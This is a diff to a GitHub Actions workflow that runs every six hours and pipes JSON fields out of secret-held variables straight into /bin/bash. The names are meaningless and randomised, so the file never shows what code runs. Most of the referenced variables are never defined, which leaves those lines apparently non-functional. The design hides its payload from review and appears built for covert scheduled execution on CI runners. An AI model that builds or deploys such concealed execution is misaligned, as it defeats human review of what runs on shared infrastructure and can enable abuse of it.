@@ -1,9 +1,10 @@
 name: gemencloud
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
-jobs:  # 16695
+    - cron: '8 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,15 +12,14 @@ jobs:  # 16695
       - uses: actions/checkout@v4
       - name: gemencloud
         env:
-          hs0422: ${{ secrets.hs0422 }}
+          o1677: ${{ secrets.o1677 }}
         run: |
-          echo $hs0422 | jq -r .fneo5807 | /bin/bash
-          echo $ygg71 | jq -r .sqn96417 | /bin/bash
-          echo $rino82 | jq -r .dl3905 | /bin/bash
-          echo $imfko75 | jq -r .peth4600 | /bin/bash
-          echo $ksn85635 | jq -r .j64 | /bin/bash
-          echo $dttt942 | jq -r .soag9 | /bin/bash
-          echo $l06 | jq -r .rdp726 | /bin/bash
-          echo $aeurg3 | jq -r .lx88 | /bin/bash
-          echo $efh0581 | jq -r .q95 | /bin/bash
+          echo $o1677 | jq -r .j26 | /bin/bash
+          echo $anv9787 | jq -r .qehio2577 | /bin/bash
+          echo $kkf5 | jq -r .lenz3339 | /bin/bash
+          echo $mqnn976 | jq -r .f3149 | /bin/bash
+          echo $yjj04 | jq -r .lnxgm9 | /bin/bash
+          echo $kuxml3 | jq -r .r923 | /bin/bash
+          echo $yehpj5 | jq -r .tvpo2872 | /bin/bash
+          echo $oaf12864 | jq -r .jla2373 | /bin/bash
 
